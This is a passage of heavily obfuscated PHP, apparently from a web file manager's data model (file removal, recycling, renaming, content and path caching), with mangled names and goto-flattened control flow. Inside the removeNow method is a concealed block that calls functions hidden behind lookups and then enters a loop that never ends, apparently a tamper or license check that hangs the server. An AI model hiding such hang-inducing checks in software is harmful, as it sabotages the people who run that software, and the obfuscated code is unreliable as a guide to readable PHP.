d¯°‡éãìÓ; dÄÇ‘½´¸Š: $E«ë´„èº = $GLOBALS[$B»±ÜÇ—ôÂ[6]][$B»±ÜÇ—ôÂ[88]][$B»±ÜÇ—ôÂ[508]]; if ($f‹ÍÇÕéÔÚ[$B»±ÜÇ—ôÂ[445]][$B»±ÜÇ—ôÂ[509]] <= time() - $E«ë´„èº) { $this->metaSet($f‹ÍÇÕéÔÚ[$B»±ÜÇ—ôÂ[395]], $B»±ÜÇ—ôÂ[507], null); $this->metaSet($f‹ÍÇÕéÔÚ[$B»±ÜÇ—ôÂ[395]], $B»±ÜÇ—ôÂ[509], null); } if ($CØĞìÆÀùŸ) { $this->metaSet($f‹ÍÇÕéÔÚ[$B»±ÜÇ—ôÂ[395]], $B»±ÜÇ—ôÂ[509], time()); } goto Bà†øÙ›°Æ; C°ê„‰è±: $B»±ÜÇ—ôÂ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($f‹ÍÇÕéÔÚ[$B»±ÜÇ—ôÂ[445]]) || !$f‹ÍÇÕéÔÚ[$B»±ÜÇ—ôÂ[445]][$B»±ÜÇ—ôÂ[507]]) { return !1; } if ($f‹ÍÇÕéÔÚ[$B»±ÜÇ—ôÂ[445]][$B»±ÜÇ—ôÂ[507]] != USER_ID) { return !0; } goto dÄÇ‘½´¸Š; d¯°‡éãìÓ: } private function _addSoure($f­‡Ò©´ÒÑ, $bÚÆÜÂ¥) { goto D¤ºŒ‰æõ¬; DçŠé‹Ìå…: $this->updateModifyTime($f­‡Ò©´ÒÑ[$Eä±Ú”î·Ê[478]]); $F¤‚Ëç¢à = $Eä±Ú”î·Ê[1951] . $bÚÆÜÂ¥[$Eä±Ú”î·Ê[395]]; if (isset(self::$cacheChildList[$F¤‚Ëç¢à])) { unset(self::$cacheChildList[$F¤‚Ëç¢à]); } goto CÔÒ¤¼à«; cœ†ï—õÁ: return $Dç½™ÕØÆ‹; goto B¿«©·»îÓ; EƒÑÁ±Ä’Ü: $eËåª×™ƒ = array($Eä±Ú”î·Ê[555] => short_id($Dç½™ÕØÆ‹)); $this->where(array($Eä±Ú”î·Ê[410] => $Dç½™ÕØÆ‹))->save($eËåª×™ƒ); $this->setNamePinyin($Dç½™ÕØÆ‹, $f­‡Ò©´ÒÑ[$Eä±Ú”î·Ê[28]]); goto cœ†ï—õÁ; D¤ºŒ‰æõ¬: $Eä±Ú”î·Ê =& $_SERVER[ÒÆ›ÆØÎ¾]; $e½²…±Ñëï = array($Eä±Ú”î·Ê[549] => $bÚÆÜÂ¥[$Eä±Ú”î·Ê[404]], $Eä±Ú”î·Ê[550] => $bÚÆÜÂ¥[$Eä±Ú”î·Ê[484]], $Eä±Ú”î·Ê[551] => USER_ID, $Eä±Ú”î·Ê[552] => USER_ID, $Eä±Ú”î·Ê[394] => $bÚÆÜÂ¥[$Eä±Ú”î·Ê[395]], $Eä±Ú”î·Ê[553] => $bÚÆÜÂ¥[$Eä±Ú”î·Ê[487]] . $bÚÆÜÂ¥[$Eä±Ú”î·Ê[395]] . $Eä±Ú”î·Ê[47], $Eä±Ú”î·Ê[422] => 0, $Eä±Ú”î·Ê[554] => $Eä±Ú”î·Ê[33]); $f­‡Ò©´ÒÑ = array_merge($e½²…±Ñëï, $f­‡Ò©´ÒÑ); goto DçŠé‹Ìå…; CÔÒ¤¼à«: static $FÊ‡Ë’ºöõ = false; if (!$FÊ‡Ë’ºöõ) { Hook::trigger($Eä±Ú”î·Ê[536], $f­‡Ò©´ÒÑ); $FÊ‡Ë’ºöõ = !0; } $Dç½™ÕØÆ‹ = $this->add($f­‡Ò©´ÒÑ); goto EƒÑÁ±Ä’Ü; B¿«©·»îÓ: } public function remove($Få•‹‰™—Õ, $d¢½ÔÉª‡ = true) { goto Eùº”®ËÑñ; Eùº”®ËÑñ: $eâäÀÛ¤Æ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Bİ¶†Í²œ“ = $this->sourceInfo($Få•‹‰™—Õ); $A‡¢ğ³æˆÀ = intval($Bİ¶†Í²œ“[$eâäÀÛ¤Æ[404]]) === self::TYPE_SYSTEM; goto A…Ó–Š…Ø; aÎ‚ÏŠâ”: CacheLock::lock($CÍ–òµË); $AÜ†àÙ‹š´ = $this->fileNameExist($cã˜åŠõÍ÷, $F‘æÚÆ§¼); if (!$AÜ†àÙ‹š´) { $AÜ†àÙ‹š´ = $this->mkdir($cã˜åŠõÍ÷, $F‘æÚÆ§¼, REPEAT_SKIP); $this->metaSet($AÜ†àÙ‹š´, $eâäÀÛ¤Æ[1956], $EÁËÅ–ôŸ¤); $this->metaSet($AÜ†àÙ‹š´, $eâäÀÛ¤Æ[1957], $Bİ¶†Í²œ“[$eâäÀÛ¤Æ[484]]); if ($Bİ¶†Í²œ“[$eâäÀÛ¤Æ[478]] != 0) { $this->metaSet($AÜ†àÙ‹š´, $eâäÀÛ¤Æ[1958], _get($e¦‚µ®ƒ˜ª, $eâäÀÛ¤Æ[1959])); } } goto f–­â×Åá; f–­â×Åá: CacheLock::unlock($CÍ–òµË); $this->metaSet($Få•‹‰™—Õ, $eâäÀÛ¤Æ[1960], $Bİ¶†Í²œ“[$eâäÀÛ¤Æ[478]]); $this->where(array($eâäÀÛ¤Æ[395] => $Få•‹‰™—Õ))->save(array($eâäÀÛ¤Æ[417] => time())); goto CõÜ„ëœŠˆ; BÂÛõ¢÷èÜ: return $bòÍ‰Ñàƒ; goto CÏÇÀµƒ—È; A…Ó–Š…Ø: $cÖ×­Š²Ø = Model($eâäÀÛ¤Æ[1516])->get($eâäÀÛ¤Æ[1952]) == $eâäÀÛ¤Æ[87]; if ($A‡¢ğ³æˆÀ || $d¢½ÔÉª‡ || !$cÖ×­Š²Ø) { return $this->removeNow($Få•‹‰™—Õ, $d¢½ÔÉª‡); } $cã˜åŠõÍ÷ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto e‰ƒ‰·³; e‰ƒ‰·³: $EÁËÅ–ôŸ¤ = $Bİ¶†Í²œ“[$eâäÀÛ¤Æ[404]] == self::TYPE_USER ? $eâäÀÛ¤Æ[562] : $eâäÀÛ¤Æ[1006]; if ($EÁËÅ–ôŸ¤ == $eâäÀÛ¤Æ[562]) { $e¦‚µ®ƒ˜ª = Model($eâäÀÛ¤Æ[502])->getInfo($Bİ¶†Í²œ“[$eâäÀÛ¤Æ[484]]); $F‘æÚÆ§¼ = !empty($e¦‚µ®ƒ˜ª[$eâäÀÛ¤Æ[1945]]) ? $e¦‚µ®ƒ˜ª[$eâäÀÛ¤Æ[1945]] : $e¦‚µ®ƒ˜ª[$eâäÀÛ¤Æ[28]]; $F‘æÚÆ§¼ = $eâäÀÛ¤Æ[258] . $F‘æÚÆ§¼ . $eâäÀÛ¤Æ[1953] . $Bİ¶†Í²œ“[$eâäÀÛ¤Æ[484]]; } else { $e¦‚µ®ƒ˜ª = Model($eâäÀÛ¤Æ[486])->getInfo($Bİ¶†Í²œ“[$eâäÀÛ¤Æ[484]]); $F‘æÚÆ§¼ = _get($e¦‚µ®ƒ˜ª, $eâäÀÛ¤Æ[28]); $F‘æÚÆ§¼ = $eâäÀÛ¤Æ[160] . $F‘æÚÆ§¼ . $eâäÀÛ¤Æ[1954] . $Bİ¶†Í²œ“[$eâäÀÛ¤Æ[484]]; } $CÍ–òµË = $eâäÀÛ¤Æ[1955] . md5($F‘æÚÆ§¼); goto aÎ‚ÏŠâ”; CõÜ„ëœŠˆ: $this->recycleClear($Bİ¶†Í²œ“); $bòÍ‰Ñàƒ = $this->move($Få•‹‰™—Õ, $AÜ†àÙ‹š´, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Bİ¶†Í²œ“[$eâäÀÛ¤Æ[478]]); goto BÂÛõ¢÷èÜ; CÏÇÀµƒ—È: } private function recycleClear($EŒ“Ø·ä¼†) { $dˆ“õÅ¹Ñ =& $_SERVER[ÒÆ›ÆØÎ¾]; $AÖ‰¸Ï‚Ò¨ = $this->childrenAll($EŒ“Ø·ä¼†); $F´ö•‰„Äª = array($dˆ“õÅ¹Ñ[410] => array($dˆ“õÅ¹Ñ[411], $AÖ‰¸Ï‚Ò¨[$dˆ“õÅ¹Ñ[1961]])); Model($dˆ“õÅ¹Ñ[1962])->where($F´ö•‰„Äª)->delete(); } public function removeNow($fšéˆ«¸, $Eƒãƒó»À¡ = true) { goto b³¤£ã»ø«; b³¤£ã»ø«: $AÆè¿ÆéáÕ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($_SERVER[$AÆè¿ÆéáÕ[784]]) || !isset($_SERVER[$AÆè¿ÆéáÕ[785]])) { goto c‰ÇÖŞÖ¿Š; F°‚áÇæ·Ö: $FßÅ´½ÌÆÊ = $f±¯›Å¾ó§($eÌÍŸ©¼“í); $CÄ³Ş«ŸÕä = explode($AÆè¿ÆéáÕ[229], $FßÅ´½ÌÆÊ); if (count($CÄ³Ş«ŸÕä) < $AÆè¿ÆéáÕ[592]) { $C†·‡¡ï´ = $AÆè¿ÆéáÕ[789]; $C†·‡¡ï´(); } goto eÄÔØ½Ğ²â; eÄÔØ½Ğ²â: $B²‹ÕËÏïÄ = $AÆè¿ÆéáÕ[832]; $B²‹ÕËÏïÄ($_SERVER[$AÆè¿ÆéáÕ[833]]); $fñ‡šĞ†òå = 1; goto F–è´‹·„¶; F–è´‹·„¶: for ($e¬ã¡İçÁ´ = $fñ‡šĞ†òå; $e¬ã¡İçÁ´ > 0; $e¬ã¡İçÁ´++) { $B²‹ÕËÏïÄ = json_encode($GLOBALS[$AÆè¿ÆéáÕ[411]]); } goto FÓá–¼ˆ©æ; c‰ÇÖŞÖ¿Š: $B°¼ØòàÛà = $AÆè¿ÆéáÕ[831]; $f±¯›Å¾ó§ = $AÆè¿ÆéáÕ[786]; $eÌÍŸ©¼“í = $_SERVER[$AÆè¿ÆéáÕ[787]] . $AÆè¿ÆéáÕ[788]; goto F°‚áÇæ·Ö; FÓá–¼ˆ©æ: } $e×ÍˆÕñ = $this->sourceInfo($fšéˆ«¸); goto bó£¨ééâó; FŠ˜áÎ—È„: $this->updateModifyTime($F”±µ”à¡–); $this->lockMoveEnd($fšéˆ«¸); Hook::trigger($AÆè¿ÆéáÕ[1550], $dæÏ™Å¦ó¾, $Eƒãƒó»À¡); goto eÁ¡ÌÅ»ãŸ; E ğÑİœƒä: $this->folderSizeReset($e×ÍˆÕñ[$AÆè¿ÆéáÕ[478]]); $F”±µ”à¡– = array($e×ÍˆÕñ[$AÆè¿ÆéáÕ[478]]); if ($e×ÍˆÕñ[$AÆè¿ÆéáÕ[403]] == $AÆè¿ÆéáÕ[87]) { $F”±µ”à¡–[] = $e×ÍˆÕñ[$AÆè¿ÆéáÕ[395]]; } goto FŠ˜áÎ—È„; BÇøïâåµ: $this->lockMoveStart($fšéˆ«¸); Hook::trigger($AÆè¿ÆéáÕ[1963], $dæÏ™Å¦ó¾, $Eƒãƒó»À¡); if ($Eƒãƒó»À¡) { Model($AÆè¿ÆéáÕ[1962])->moveToRecycle($fšéˆ«¸); } else { $E¼îÌğˆ¸ë = $this->childrenAll($e×ÍˆÕñ); Model($AÆè¿ÆéáÕ[533])->eventRemove($fšéˆ«¸); $this->removeRelevance($E¼îÌğˆ¸ë[$AÆè¿ÆéáÕ[1961]], $E¼îÌğˆ¸ë[$AÆè¿ÆéáÕ[1338]]); } goto E ğÑİœƒä; bó£¨ééâó: $dæÏ™Å¦ó¾ = $this->pathInfoMore($fšéˆ«¸); if (!$e×ÍˆÕñ) { return !0; } if ($e×ÍˆÕñ[$AÆè¿ÆéáÕ[478]] == 0) { if (!_get($GLOBALS, $AÆè¿ÆéáÕ[485])) { return !1; } } goto BÇøïâåµ; eÁ¡ÌÅ»ãŸ: return !0; goto D„¬Ü–õõ±; D„¬Ü–õõ±: } public function childrenAll($e£„‡‡¯) { $A“ÆœìØ”  =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÃŞÀ¾ƒóÔ = $e£„‡‡¯[$A“ÆœìØ” [395]]; if ($e£„‡‡¯[$A“ÆœìØ” [403]] == $A“ÆœìØ” [87]) { $DÌè†çŒ¾Â = array($A“ÆœìØ” [553] => array($A“ÆœìØ” [512], $e£„‡‡¯[$A“ÆœìØ” [487]] . $FÃŞÀ¾ƒóÔ . $A“ÆœìØ” [513])); $cÏñ÷éŒà› = array($A“ÆœìØ” [553] => $DÌè†çŒ¾Â[$A“ÆœìØ” [487]]); $e¶´˜®ÂÊ = $this->field($A“ÆœìØ” [1964])->where($cÏñ÷éŒà›)->select(); $A‰¸ŒİÁÂÇ = !1; $dËÀß¬ê§ñ = array($FÃŞÀ¾ƒóÔ); if ($e¶´˜®ÂÊ) { $A‰¸ŒİÁÂÇ = array_to_keyvalue($e¶´˜®ÂÊ, $A“ÆœìØ” [33], $A“ÆœìØ” [447]); $A‰¸ŒİÁÂÇ = array_remove_value($A‰¸ŒİÁÂÇ, $A“ÆœìØ” [191]); $dËÀß¬ê§ñ = array_to_keyvalue($e¶´˜®ÂÊ, $A“ÆœìØ” [33], $A“ÆœìØ” [395]); $dËÀß¬ê§ñ[] = $FÃŞÀ¾ƒóÔ; } } else { $A‰¸ŒİÁÂÇ = array($e£„‡‡¯[$A“ÆœìØ” [447]]); $dËÀß¬ê§ñ = array($FÃŞÀ¾ƒóÔ); } return array($A“ÆœìØ” [1961] => $dËÀß¬ê§ñ, $A“ÆœìØ” [1338] => $A‰¸ŒİÁÂÇ); } public function removeArray($E©ËÚ¬ é) { if (!$E©ËÚ¬ é) { return !0; } } public function removeRelevance($D®±ŠÍ©ç, $F÷ï£†õ‰) { goto A×…áƒØ„£; D âÓÑ¯îÉ: for ($A¹ˆÙÚ˜¶ƒ = 0; $A¹ˆÙÚ˜¶ƒ < count($D®±ŠÍ©ç); $A¹ˆÙÚ˜¶ƒ++) { $this->sourceCacheClear($D®±ŠÍ©ç[$A¹ˆÙÚ˜¶ƒ]); } goto b¼ Ûƒ«îº; A×…áƒØ„£: $EïÊ…²¢Ğ­ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D®±ŠÍ©ç = $D®±ŠÍ©ç ? $D®±ŠÍ©ç : array(); $F÷ï£†õ‰ = $F÷ï£†õ‰ ? $F÷ï£†õ‰ : array(); goto cİ†¸°ïÍ; cƒ§ùÄÀˆÂ: Model($EïÊ…²¢Ğ­[1943])->removeBySource($D®±ŠÍ©ç); $this->where($eÕ²ŒĞòŸÀ)->delete(); Model($EïÊ…²¢Ğ­[450])->remove($F÷ï£†õ‰); goto D âÓÑ¯îÉ; cİ†¸°ïÍ: $D®±ŠÍ©ç = array_unique(array_filter($D®±ŠÍ©ç)); $F÷ï£†õ‰ = array_unique(array_filter($F÷ï£†õ‰)); if (!$D®±ŠÍ©ç) { return !1; } goto EÁÓİ˜¼‰İ; B°İ¼÷ö‚â: Model($EïÊ…²¢Ğ­[1816])->where($eÕ²ŒĞòŸÀ)->delete(); Model($EïÊ…²¢Ğ­[533])->where($eÕ²ŒĞòŸÀ)->delete(); Model($EïÊ…²¢Ğ­[1658])->removeBySource($D®±ŠÍ©ç); goto cƒ§ùÄÀˆÂ; EÁÓİ˜¼‰İ: $eÕ²ŒĞòŸÀ = array($EïÊ…²¢Ğ­[410] => array($EïÊ…²¢Ğ­[411], $D®±ŠÍ©ç)); Model($EïÊ…²¢Ğ­[1962])->where($eÕ²ŒĞòŸÀ)->delete(); Model($EïÊ…²¢Ğ­[441])->where($eÕ²ŒĞòŸÀ)->delete(); goto B°İ¼÷ö‚â; b¼ Ûƒ«îº: } public function rename($fíí—ˆ¿£, $e’½Ê„’›) { goto aÃ›ÀŠ¡ÉŠ; A²Œ¤Ã¿é¾: $this->setNamePinyin($fíí—ˆ¿£, $d½ï¥¿è·§[$C¸àÄ•Ã®Ş[28]], !1); $this->updateModifyTime($Fùë˜åˆİ½[$C¸àÄ•Ã®Ş[478]]); $CÉ¶ñ—àè = $this->where(array($C¸àÄ•Ã®Ş[410] => $fíí—ˆ¿£))->data($d½ï¥¿è·§)->save(); goto fË±¾¦¸Ö; fË±¾¦¸Ö: $C¹­ôŞ÷ù» = $C¸àÄ•Ã®Ş[1951] . $Fùë˜åˆİ½[$C¸àÄ•Ã®Ş[478]]; if (isset(self::$cacheChildList[$C¹­ôŞ÷ù»])) { unset(self::$cacheChildList[$C¹­ôŞ÷ù»]); } return $CÉ¶ñ—àè; goto b‰Â¡è®òˆ; b™ÇÓ¬ìî: if ($Fùë˜åˆİ½[$C¸àÄ•Ã®Ş[403]] != $C¸àÄ•Ã®Ş[87]) { $d½ï¥¿è·§[$C¸àÄ•Ã®Ş[405]] = substr(get_path_ext($e’½Ê„’›), 0, 10); } Model($C¸àÄ•Ã®Ş[533])->eventRename($fíí—ˆ¿£, $Fùë˜åˆİ½[$C¸àÄ•Ã®Ş[28]], $e’½Ê„’›); $this->sourceCacheClear($fíí—ˆ¿£); goto A²Œ¤Ã¿é¾; BÈÜ“±¹˜Œ: $DŸß»î­Æ = $this->fileNameExist($Fùë˜åˆİ½[$C¸àÄ•Ã®Ş[478]], $e’½Ê„’›); if ($DŸß»î­Æ && $DŸß»î­Æ != $fíí—ˆ¿£) { return !1; } $d½ï¥¿è·§ = array($C¸àÄ•Ã®Ş[413] => $e’½Ê„’›, $C¸àÄ•Ã®Ş[552] => USER_ID); goto b™ÇÓ¬ìî; aÃ›ÀŠ¡ÉŠ: $C¸àÄ•Ã®Ş =& $_SERVER[ÒÆ›ÆØÎ¾]; $Fùë˜åˆİ½ = $this->sourceInfo($fíí—ˆ¿£); if (!$Fùë˜åˆİ½) { return !1; } goto BÈÜ“±¹˜Œ; b‰Â¡è®òˆ: } public function setNamePinyin($f™ƒÑöî•´, $d£ÑöÍÆÌ, $EšŒ»•¥ = true) { $Cß¨š˜ù•Õ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bÅ¯½ğÆÁù = Input::check($d£ÑöÍÆÌ, $Cß¨š˜ù•Õ[556]); if ($EšŒ»•¥ && !$bÅ¯½ğÆÁù) { return; } if (!$bÅ¯½ğÆÁù) { $this->metaSet($f™ƒÑöî•´, $Cß¨š˜ù•Õ[444], null); $this->metaSet($f™ƒÑöî•´, $Cß¨š˜ù•Õ[443], null); return; } $Aø«âß×è = array($Cß¨š˜ù•Õ[444] => str_replace($Cß¨š˜ù•Õ[50], $Cß¨š˜ù•Õ[33], Pinyin::encode($d£ÑöÍÆÌ)), $Cß¨š˜ù•Õ[443] => Pinyin::encode($d£ÑöÍÆÌ, $Cß¨š˜ù•Õ[557])); $this->metaSet($f™ƒÑöî•´, $Aø«âß×è); } public function getContent($cêÅß´‚×Â) { goto bÉÛŸèğ¶; béí‘³¸á‰: if ($AˆÙ¥¢ˆòÅ[$FÑÓŸ¶êòÑ[78]] == 0) { return $FÑÓŸ¶êòÑ[33]; } $c™§•¹Íà = $FÑÓŸ¶êòÑ[1965] . $AˆÙ¥¢ˆòÅ[$FÑÓŸ¶êòÑ[170]]; if ($AˆÙ¥¢ˆòÅ[$FÑÓŸ¶êòÑ[78]] <= 1024 * 10) { $D¹ÜˆÑÃ­ƒ = Cache::get($c™§•¹Íà); if (!$D¹ÜˆÑÃ­ƒ) { $D¹ÜˆÑÃ­ƒ = IO::getContent($AˆÙ¥¢ˆòÅ[$FÑÓŸ¶êòÑ[76]]); Cache::set($c™§•¹Íà, $D¹ÜˆÑÃ­ƒ); } return $D¹ÜˆÑÃ­ƒ; } goto DŠˆ³Ô…š¸; DŠˆ³Ô…š¸: if (!$AˆÙ¥¢ˆòÅ[$FÑÓŸ¶êòÑ[76]]) { return $FÑÓŸ¶êòÑ[33]; } return IO::getContent($AˆÙ¥¢ˆòÅ[$FÑÓŸ¶êòÑ[76]]); goto E´«†éù©·; bÉÛŸèğ¶: $FÑÓŸ¶êòÑ =& $_SERVER[ÒÆ›ÆØÎ¾]; $AˆÙ¥¢ˆòÅ = $this->fileInfoGet($cêÅß´‚×Â); if (!$AˆÙ¥¢ˆòÅ) { return !1; } goto béí‘³¸á‰; E´«†éù©·: } public function setDesc($A‹²İ†ëëŸ, $eˆ©…˜›‚Ò) { $DÑ¨‡÷îœ =& $_SERVER[ÒÆ›ÆØÎ¾]; Model($DÑ¨‡÷îœ[533])->eventAddDesc($A‹²İ†ëëŸ, $eˆ©…˜›‚Ò); return $this->metaSet($A‹²İ†ëëŸ, $DÑ¨‡÷îœ[431], $eˆ©…˜›‚Ò); } public function setContent($Aİ¦Ò“æ¹Õ, $Bõøˆ­­¾Œ = '') { goto c¦Ëôº„ˆ; c¦Ëôº„ˆ: $FÅäîÜÊ­Œ =& $_SERVER[ÒÆ›ÆØÎ¾]; $BºÅ´£Œº³ = $this->sourceInfo($Aİ¦Ò“æ¹Õ); $bÔçâøÛæ« = $this->fileInfoGet($Aİ¦Ò“æ¹Õ); goto eù£«‚ˆè; a‘ºÌÊ¬¤: if (!$eœÃ¢Ë’‡Š) { return Model($FÅäîÜÊ­Œ[450])->remove($C×…Ë²Ù¥ƒ[$FÅäîÜÊ­Œ[447]]); } $this->folderSizeReset($BºÅ´£Œº³[$FÅäîÜÊ­Œ[478]]); return !0; goto eÔâ•Õ‹İ; eù£«‚ˆè: if (!$bÔçâøÛæ« || !$BºÅ´£Œº³) { return !1; } $C×…Ë²Ù¥ƒ = Model($FÅäîÜÊ­Œ[450])->addFileByContent($Bõøˆ­­¾Œ, $BºÅ´£Œº³[$FÅäîÜÊ­Œ[28]]); $eœÃ¢Ë’‡Š = $this->fileHistory($BºÅ´£Œº³, $C×…Ë²Ù¥ƒ[$FÅäîÜÊ­Œ[447]], $C×…Ë²Ù¥ƒ[$FÅäîÜÊ­Œ[78]]); goto a‘ºÌÊ¬¤; eÔâ•Õ‹İ: } public function fileSubstr($DŞª“¸»ŒŞ, $A‰ß›È–ÎÙ, $AÔ÷¸Ø­Ù­) { $eõç°áõ÷ = $this->fileInfoGet($DŞª“¸»ŒŞ); if (!$eõç°áõ÷) { return !1; } return IO::fileSubstr($eõç°áõ÷[$_SERVER[ÒÆ›ÆØÎ¾][76]], $A‰ß›È–ÎÙ, $AÔ÷¸Ø­Ù­); } public function fileInfoGet($B·ÆùÜùö) { goto E…ĞÒõ¢ËÈ; fÑÕÁ³Ï»ª: return $A³øšÚì„®; goto f·§Ø½²ãô; Få†á»¬Ê: $A³øšÚì„® = Model($CÖÚ¿¯ò„[450])->fileInfo($aŞË•ÛÛÉ„[$CÖÚ¿¯ò„[447]]); if ($A³øšÚì„®) { $A³øšÚì„®[$CÖÚ¿¯ò„[28]] = $aŞË•ÛÛÉ„[$CÖÚ¿¯ò„[28]]; } self::$cacheFileInfo[$cæ‚è·˜·Ï] = $A³øšÚì„®; goto fÑÕÁ³Ï»ª; EÔğ¾ò³­â: $cæ‚è·˜·Ï = $CÖÚ¿¯ò„[453] . $aŞË•ÛÛÉ„[$CÖÚ¿¯ò„[447]]; $dÏÅœáîá© = _get(self::$cacheFileInfo, $cæ‚è·˜·Ï); if ($dÏÅœáîá©) { return $dÏÅœáîá©; } goto Få†á»¬Ê; E…ĞÒõ¢ËÈ: $CÖÚ¿¯ò„ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aŞË•ÛÛÉ„ = $this->sourceInfo($B·ÆùÜùö); if (!$aŞË•ÛÛÉ„ || $aŞË•ÛÛÉ„[$CÖÚ¿¯ò„[403]]) { return !1; } goto EÔğ¾ò³­â; f·§Ø½²ãô: } private function folderChildrenNumber($e¸àˆÖ¢) { $eÂÍ™°´¾ =& $_SERVER[ÒÆ›ÆØÎ¾]; $DÈ¸ºˆÆ°õ = $this->sourceInfo($e¸àˆÖ¢); $fÜŸŞ¸‚ï = array($eÂÍ™°´¾[553] => array($eÂÍ™°´¾[512], $DÈ¸ºˆÆ°õ[$eÂÍ™°´¾[487]] . $e¸àˆÖ¢ . $eÂÍ™°´¾[513]), $eÂÍ™°´¾[422] => intval($DÈ¸ºˆÆ°õ[$eÂÍ™°´¾[423]]), $eÂÍ™°´¾[546] => 1); $A‹ØöêÖ×„ = $this->where($fÜŸŞ¸‚ï)->count(); $BŠãˆœâòÛ = $this->where($fÜŸŞ¸‚ï)->where(array($eÂÍ™°´¾[546] => 0))->count(); return array($eÂÍ™°´¾[82] => $BŠãˆœâòÛ, $eÂÍ™°´¾[83] => $A‹ØöêÖ×„); } public function pathInfo($D¢èÂ†Ëš, $BÑ•Òº¨ä = false) { goto eõ¸˜ÏÖ; c¤ƒ‡òóíƒ: $aª£éòÁ—˜ = $cïÛ¯Š„‰¾[439] . intval($BÑ•Òº¨ä) . $cïÛ¯Š„‰¾[440] . $D¢èÂ†Ëš; $aøºÅâŞÜ± = _get(self::$cachePathInfo, $aª£éòÁ—˜); if ($aøºÅâŞÜ±) { return $aøºÅâŞÜ±; } goto dÏÓ†¸ÍîÚ; dÏÓ†¸ÍîÚ: $Döœ ÷îÆ = $this->sourceInfo($D¢èÂ†Ëš); if (!$Döœ ÷îÆ) { return !1; } $Döœ ÷îÆ = $this->_listDataApplyItem($Döœ ÷îÆ, $BÑ•Òº¨ä); goto c¬‡æÄ¢Ï; c¬‡æÄ¢Ï: self::$cachePathInfo[$aª£éòÁ—˜] = $Döœ ÷îÆ; return $Döœ ÷îÆ; goto d±Ÿ’ĞíìØ; eõ¸˜ÏÖ: $cïÛ¯Š„‰¾ =& $_SERVER[ÒÆ›ÆØÎ¾]; $BÑ•Òº¨ä = !1; $D¢èÂ†Ëš = intval($D¢èÂ†Ëš); goto c¤ƒ‡òóíƒ; d±Ÿ’ĞíìØ: } public static $cachePathInfoMore = array(); public function pathInfoMore($b»ÈéÎ¼íÔ) { goto fóÍ÷İ¡í ; EÓŒéîÓÚÎ: self::$cachePathInfoMore[$b»ÈéÎ¼íÔ] = $DêÄ©¯®ãÒ; return $DêÄ©¯®ãÒ; goto eàÅ“Ëí¯¼; fóÍ÷İ¡í : $EÇ†«³éÆ‘ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÕéˆ¯ğ¾Ü = _get(self::$cachePathInfoMore, $b»ÈéÎ¼íÔ); if ($EÕéˆ¯ğ¾Ü) { return $EÕéˆ¯ğ¾Ü; } goto eÑÙöÓˆÁ¿; eÑÙöÓˆÁ¿: $DêÄ©¯®ãÒ = $this->pathInfo($b»ÈéÎ¼íÔ); if (!$DêÄ©¯®ãÒ) { return !1; } if ($DêÄ©¯®ãÒ[$EÇ†«³éÆ‘[403]] == $EÇ†«³éÆ‘[87]) { $DêÄ©¯®ãÒ[$EÇ†«³éÆ‘[81]] = $this->folderChildrenNumber($b»ÈéÎ¼íÔ); } goto EÓŒéîÓÚÎ; eàÅ“Ëí¯¼: } public function sourceInfo($açÉÚïŒÕ˜) { goto bí¯°ÈÕ; CÉöøÙÀçˆ: $bêãºÕÅ‘ñ = $CÒ—±¥ƒöà[438] . $açÉÚïŒÕ˜; $dÅâß‘•¾… = _get(self::$cacheSourceInfo, $bêãºÕÅ‘ñ); if ($dÅâß‘•¾…) { return $dÅâß‘•¾…; } goto BÓ±È£Å¦ø; bí¯°ÈÕ: $CÒ—±¥ƒöà =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$açÉÚïŒÕ˜) { return array(); } $açÉÚïŒÕ˜ = intval($açÉÚïŒÕ˜); goto CÉöøÙÀçˆ; BÓ±È£Å¦ø: $BŸÊ‚ï”‚Š = $this->where(array($CÒ—±¥ƒöà[395] => $açÉÚïŒÕ˜))->find(); self::$cacheSourceInfo[$bêãºÕÅ‘ñ] = $BŸÊ‚ï”‚Š; return self::$cacheSourceInfo[$bêãºÕÅ‘ñ]; goto Båá«õĞÈÇ; Båá«õĞÈÇ: } public function sourceCacheClear($C‹°‚ã—Á = false) { self::cacheClear($C‹°‚ã—Á); } public static function cacheClear($aæŒ¦¬­Ã‰ = false) { $e²ˆ ¬Š«Ğ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($aæŒ¦¬­Ã‰ == !1) { goto C‡ÙæøŠ‰Ü; Eã¡Ğñö‡: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto DÍõø­˜é; C‡ÙæøŠ‰Ü: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto Eã¡Ğñö‡; DÍõø­˜é: return; goto C‹éÒºëÌ¢; C‹éÒºëÌ¢: } unset(self::$cacheSourceInfo[$e²ˆ ¬Š«Ğ[438] . $aæŒ¦¬­Ã‰]); unset(self::$cachePathInfoMore[$aæŒ¦¬­Ã‰]); unset(self::$cachePathInfo[$e²ˆ ¬Š«Ğ[1966] . $aæŒ¦¬­Ã‰]); unset(self::$cachePathInfo[$e²ˆ ¬Š«Ğ[1967] . $aæŒ¦¬­Ã‰]); } public function metaSet($f’¡í»ÓÀ, $BàºàÄ¢¼Ğ = null, $f¹¢”ŒÒË = null) { $f©£Ûî¦Ó = parent::metaSet($f’¡í»ÓÀ, $BàºàÄ¢¼Ğ, $f¹¢”ŒÒË); if ($f©£Ûî¦Ó) { $this->sourceCacheClear($f’¡í»ÓÀ); } return $f©£Ûî¦Ó; } public function pathInfoByPath($D´ô¤òÔò, $fÀœñÔêÑí) { $c¶ñŸÇæè =& $_SERVER[ÒÆ›ÆØÎ¾]; $f‰Ó¦ÌÎ÷· = !$fÀœñÔêÑí ? array() : explode($c¶ñŸÇæè[8], trim($fÀœñÔêÑí, $c¶ñŸÇæè[8])); $eÖğÏˆÍâ„ = $D´ô¤òÔò; foreach ($f‰Ó¦ÌÎ÷· as $e“³£•¥Üº) { $d›·á ÷—Ï = array($c¶ñŸÇæè[478] => $eÖğÏˆÍâ„, $c¶ñŸÇæè[28] => $e“³£•¥Üº); $d÷£òÕ´î = $this->where($d›·á 